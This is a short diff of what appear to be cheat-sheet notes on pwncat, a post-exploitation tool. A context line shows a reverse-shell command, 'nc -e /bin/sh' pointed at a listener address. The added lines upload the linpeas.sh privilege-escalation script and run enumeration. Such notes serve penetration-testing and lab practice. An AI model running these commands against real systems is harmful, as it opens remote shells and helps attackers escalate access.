@@ -10,7 +10,11 @@ V >nc -e /bin/sh 10.0.0.1 4444
 L >cntrl+d 
 L >run help
 ```
+``` 
+(local) > upload /opt/linpeas.sh
 
+(local) > enum -s -a
+```
 
 # pwncat
 
